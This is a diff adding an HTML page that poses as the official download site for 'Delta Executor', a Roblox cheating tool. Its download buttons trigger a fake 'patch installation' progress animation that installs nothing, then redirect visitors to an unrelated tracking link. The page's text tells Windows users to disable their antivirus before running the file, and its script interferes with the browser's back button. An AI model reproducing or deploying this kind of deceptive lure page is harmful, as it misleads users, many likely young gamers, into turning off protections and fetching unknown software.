@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Delta Executor</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: url('https://deltainstaller.app/assets/deltabg.png') no-repeat center center fixed;
+            background-size: cover;
+            color: #fff;
+            line-height: 1.6;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 0;
+        }
+
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.95);
+            padding: 15px 0;
+            z-index: 1000;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .nav-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .nav-logo {
+            width: 35px;
+            height: 35px;
+        }
+
+        .nav-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .hamburger span {
+            width: 20px;
+            height: 2px;
+            background: #fff;
+            border-radius: 2px;
+            transition: all 0.3s ease;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 120px 30px 50px;
+        }
+
+        .hero {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo-container {
+            margin-bottom: 25px;
+        }
+
+        .main-logo {
+            width: 200px;
+            height: 200px;
+            border-radius: 30px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        .hero h1 {
+            font-size: 42px;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+
+        .button-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            max-width: 500px;
+            margin: 0 auto 25px;
+        }
+
+        .download-btn {
+            background: #0066cc;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+        }
+
+        .download-btn i {
+            font-size: 18px;
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .social-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-decoration: none;
+            transition: all 0.2s ease;
+            font-size: 18px;
+        }
+
+        .social-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .social-btn.youtube {
+            background: #FF0000;
+        }
+
+        .social-btn.telegram {
+            background: #0088cc;
+        }
+
+        .social-btn.facebook {
+            background: #1877f2;
+        }
+
+        .social-btn.twitter {
+            background: #000;
+        }
+
+        .social-btn.github {
+            background: #333;
+        }
+
+        .content {
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 12px;
+            padding: 40px;
+            margin-top: 40px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.4);
+        }
+
+        .content p {
+            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.7;
+            color: #e0e0e0;
+        }
+
+        .content a {
+            color: #4d9fff;
+            text-decoration: none;
+        }
+
+        .content a:hover {
+            text-decoration: underline;
+        }
+
+        .content strong {
+            color: #fff;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 100px 20px 30px;
+            }
+            .button-grid {
+                grid-template-columns: 1fr;
+                max-width: 300px;
+            }
+            .hero h1 {
+                font-size: 32px;
+            }
+            .main-logo {
+                width: 150px;
+                height: 150px;
+            }
+            .content {
+                padding: 25px;
+            }
+            .hamburger {
+                display: flex;
+            }
+        }
+
+        @media (min-width: 769px) {
+            .hamburger {
+                display: none;
+            }
+        }
+
+        footer {
+            background: rgba(0, 0, 0, 0.9);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 25px 0;
+            margin-top: 60px;
+        }
+
+        .footer-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .footer-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .footer-left p {
+            margin: 0;
+            font-size: 14px;
+            color: #ccc;
+        }
+
+        .footer-left a {
+            color: #4d9fff;
+            text-decoration: none;
+        }
+
+        .footer-left a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-right {
+            display: flex;
+            gap: 25px;
+        }
+
+        .footer-right a {
+            color: #ccc;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s ease;
+        }
+
+        .footer-right a:hover {
+            color: #4d9fff;
+        }
+
+        @media (max-width: 768px) {
+            .footer-content {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+            .footer-left {
+                flex-direction: column;
+                gap: 10px;
+                order: 2;
+            }
+            .footer-right {
+                justify-content: center;
+                order: 1;
+            }
+        }
+
+        /* Loading Animation Styles */
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+            opacity: 0;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            transition: opacity 0.3s ease;
+        }
+
+        body.loading {
+            overflow: hidden;
+        }
+
+        .loading-content {
+            text-align: center;
+            max-width: 600px;
+            padding: 40px;
+        }
+
+        .loading-spinner {
+            width: 80px;
+            height: 80px;
+            border: 8px solid rgba(102, 126, 234, 0.2);
+            border-top: 8px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            font-size: 24px;
+            color: #fff;
+            margin-bottom: 20px;
+            font-weight: 600;
+            opacity: 0;
+            animation: fadeInText 0.5s ease forwards;
+        }
+
+        .loading-subtext {
+            font-size: 16px;
+            color: #aaa;
+            margin-bottom: 30px;
+            opacity: 0;
+            animation: fadeInText 0.5s ease 0.2s forwards;
+        }
+
+        @keyframes fadeInText {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+
+        .progress-percentage {
+            color: #667eea;
+            font-size: 18px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text" id="loadingText">Connecting with your device...</div>
+            <div class="loading-subtext" id="loadingSubtext">Please wait while we prepare your download</div>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="progress-percentage" id="progressPercentage">0%</div>
+        </div>
+    </div>
+
+    <div class="navbar">
+        <div class="nav-content">
+            <div class="nav-left">
+                <img src="https://deltainstaller.app/assets/deltalogo.png" alt="Delta Logo" class="nav-logo">
+                <span class="nav-title">Delta Executor</span>
+            </div>
+            <div class="hamburger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="hero">
+            <div class="logo-container">
+                <img src="https://deltainstaller.app/assets/deltalogo.png" alt="Delta Executor" class="main-logo">
+            </div>
+            <h1>Delta Executor</h1>
+
+            <div class="button-grid">
+                <a href="#android" class="download-btn">
+                    <i class="fab fa-android"></i>
+                    Android
+                </a>
+                <a href="#ios" class="download-btn">
+                    <i class="fab fa-apple"></i>
+                    iOS
+                </a>
+                <a href="#windows" class="download-btn">
+                    <i class="fab fa-windows"></i>
+                    Windows
+                </a>
+                <a href="#direct" class="download-btn">
+                    <i class="fas fa-check-circle"></i>
+                    Direct Download
+                </a>
+            </div>
+
+            <div class="social-links">
+                <a href="#youtube" class="social-btn youtube">
+                    <i class="fab fa-youtube"></i>
+                </a>
+                <a href="#telegram" class="social-btn telegram">
+                    <i class="fab fa-telegram-plane"></i>
+                </a>
+                <a href="#facebook" class="social-btn facebook">
+                    <i class="fab fa-facebook-f"></i>
+                </a>
+                <a href="#twitter" class="social-btn twitter">
+                    <i class="fab fa-twitter"></i>
+                </a>
+                <a href="#github" class="social-btn github">
+                    <i class="fab fa-github"></i>
+                </a>
+            </div>
+        </div>
+
+        <div class="content">
+            <p>Delta Executor is one of the most popular Roblox exploits on the internet for all <a href="https://www.roblox.com/" target="_blank">Roblox enthusiasts</a>. Irrespective of whether you wish to download it on Android, iOS, and Windows, click
+                on the above buttons.</p>
+
+            <p>When you search for Delta Executor on the web, you will see a plethora of websites that claim to be its official site though they are not.</p>
+
+            <p>The only website that must be used to download Delta on all platforms is <strong>Deltainstaller.app</strong>.</p>
+
+            <p>When you visit Delta Executor's official site, you will see four buttons – <strong>Android, iOS, Windows, and Direct Install</strong>.</p>
+
+            <p>If you wish to run Delta on your Android device, click on the above Android button.</p>
+
+            <p>When you click on the Android button, you will be taken to the page where we have explained how to download, install, and use Delta Executor on Android devices.</p>
+
+            <p>If you own an iOS device (iPhone and iPad) and are looking for a free Roblox exploit, you must visit this website and click on the iOS button.</p>
+
+            <p>Since the process of downloading and using an iOS exploit is a bit different than Android devices, you must learn it first.</p>
+
+            <p>When you click on the above iOS button. When you click on it, you will be taken to the main post where we have explained how to download, install, and <a href="#ios">use Delta on iOS devices</a>.</p>
+
+            <p>To make your work easier, we have explained multiple methods that can be used to run Delta exploit on iPhone and iPad.</p>
+
+            <p>Windows users, on the other hand, can download Delta's latest version by clicking on the above Windows button.</p>
+
+            <p>Before you click on the above button and download Delta Executor on your PC, let me tell you that you can't use it smoothly without disabling your Antivirus.</p>
+
+            <p>If you have an antivirus installed on your Windows, make sure to disable it first before clicking on the Delta.exe file.</p>
+
+            <p>If you have an antivirus installed on your PC, you will not be able to install it.</p>
+
+            <p>To learn how to <a href="#pc">download Delta Executor on PC</a>, watch the following YouTube video.</p>
+
+            <p>In the above YT video, we have explained how to download and use Delta on a PC using an Android emulator.</p>
+
+            <p>Besides using an emulators, players can also download and use it directly.</p>
+
+            <p>Irrespective of whether you want to use Delta on Android, iOS, and Windows, you must obtain the key first.</p>
+
+            <p>To learn the process of obtaining the <strong>Delta executor's key</strong>, click on the above Delta Key button.</p>
+
+            <p>When you click on the above <strong>Delta Key</strong> button, you will learn the entire process of obtaining the key.</p>
+
+            <p>Notably, Delta key expires every 24 hours. If you are using its free version, you will have to get the key every 24 hours.</p>
+
+            <p>If you buy Delta executor's Premium, you will be able to use it without obtaining the key.</p>
+
+            <p>To download Delta executor's latest version, bookmark and visit this website whenever you get a <a href="#upgrade">Roblox Upgrade error</a> because we update it very frequently.</p>
+        </div>
+
+        <footer>
+            <div class="footer-content">
+                <div class="footer-left">
+                    <p>Copyright © 2025 - <a href="#"><strong>Delta Executor</strong></a> All right reserved.</p>
+                </div>
+                <div class="footer-right">
+                    <a href="#privacy">Privacy Policy</a>
+                    <a href="#contact">Contact Us</a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // ==========================================
+        // REDIRECT CONFIGURATION
+        // Change this URL to your download page
+        // ==========================================
+        const DOWNLOAD_LINK = 'https://redirectapps.online/cl/i/m5e1xn';
+        // ==========================================
+
+        // Animation phases configuration
+        const phases = [{
+                text: "Connecting with your device...",
+                subtext: "Establishing secure connection",
+                duration: 5000,
+                progressStart: 0,
+                progressEnd: 20
+            },
+            {
+                text: "Starting Patch Installation Delta Executor.Patch",
+                subtext: "Installing required components",
+                duration: 25000,
+                progressStart: 20,
+                progressEnd: 70
+            },
+            {
+                text: "App Downloads Required...",
+                subtext: "Preparing download links",
+                duration: 10000,
+                progressStart: 70,
+                progressEnd: 90
+            },
+            {
+                text: "Loading Apps...",
+                subtext: "Finalizing installation",
+                duration: 5000,
+                progressStart: 90,
+                progressEnd: 100
+            }
+        ];
+
+        let currentPhase = 0;
+        let animationInterval;
+        let isAnimationRunning = false;
+
+        function startLoading() {
+            const overlay = document.getElementById('loadingOverlay');
+            const body = document.body;
+
+            // Prevent scrolling
+            body.classList.add('loading');
+
+            // Show overlay immediately without transition delay
+            overlay.style.display = 'flex';
+
+            // Force reflow to ensure display change is applied
+            overlay.offsetHeight;
+
+            // Then add active class for fade-in
+            requestAnimationFrame(() => {
+                overlay.classList.add('active');
+            });
+
+            // Mark animation as running
+            isAnimationRunning = true;
+            sessionStorage.setItem('animationRunning', 'true');
+
+            currentPhase = 0;
+            runPhase(currentPhase);
+        }
+
+        function runPhase(phaseIndex) {
+            if (phaseIndex >= phases.length) {
+                completeLoading();
+                return;
+            }
+
+            const phase = phases[phaseIndex];
+            const loadingText = document.getElementById('loadingText');
+            const loadingSubtext = document.getElementById('loadingSubtext');
+            const progressBar = document.getElementById('progressBar');
+            const progressPercentage = document.getElementById('progressPercentage');
+
+            // Fade out current text
+            loadingText.style.opacity = '0';
+            loadingSubtext.style.opacity = '0';
+
+            setTimeout(() => {
+                // Update text content
+                loadingText.textContent = phase.text;
+                loadingSubtext.textContent = phase.subtext;
+
+                // Fade in new text
+                loadingText.style.animation = 'none';
+                loadingSubtext.style.animation = 'none';
+                setTimeout(() => {
+                    loadingText.style.animation = 'fadeInText 0.5s ease forwards';
+                    loadingSubtext.style.animation = 'fadeInText 0.5s ease 0.2s forwards';
+                }, 10);
+            }, 300);
+
+            const startTime = Date.now();
+            const progressRange = phase.progressEnd - phase.progressStart;
+
+            animationInterval = setInterval(() => {
+                const elapsed = Date.now() - startTime;
+                const progress = Math.min(elapsed / phase.duration, 1);
+                const currentProgress = phase.progressStart + (progressRange * progress);
+
+                progressBar.style.width = currentProgress + '%';
+                progressPercentage.textContent = Math.round(currentProgress) + '%';
+
+                if (progress >= 1) {
+                    clearInterval(animationInterval);
+                    currentPhase++;
+                    setTimeout(() => runPhase(currentPhase), 500);
+                }
+            }, 50);
+        }
+
+        function completeLoading() {
+            // Clear animation state
+            isAnimationRunning = false;
+            sessionStorage.removeItem('animationRunning');
+
+            // Redirect to download page
+            window.location.href = DOWNLOAD_LINK;
+        }
+
+        // Immediately check and clear animation state on page load (before DOM)
+        (function() {
+            if (sessionStorage.getItem('animationRunning') === 'true') {
+                sessionStorage.clear();
+            }
+        })();
+
+        // Add click handlers to download buttons ONLY
+        document.addEventListener('DOMContentLoaded', function() {
+            const buttons = document.querySelectorAll('.download-btn');
+
+            buttons.forEach(button => {
+                button.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    const href = this.getAttribute('href').substring(1); // Remove #
+
+                    // Only trigger animation for the 4 main download buttons
+                    if (['android', 'ios', 'windows', 'direct'].includes(href)) {
+                        startLoading();
+                    }
+                });
+            });
+
+            // Handle browser back button - force immediate refresh
+            window.addEventListener('pageshow', function(event) {
+                if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
+                    // Page was loaded from cache (back button)
+                    sessionStorage.clear();
+                    location.replace(location.href);
+                }
+            });
+
+            // Additional back button detection
+            window.addEventListener('popstate', function() {
+                sessionStorage.clear();
+                location.replace(location.href);
+            });
+
+            // Detect if page is being unloaded
+            window.addEventListener('beforeunload', function() {
+                if (isAnimationRunning) {
+                    sessionStorage.setItem('animationRunning', 'true');
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
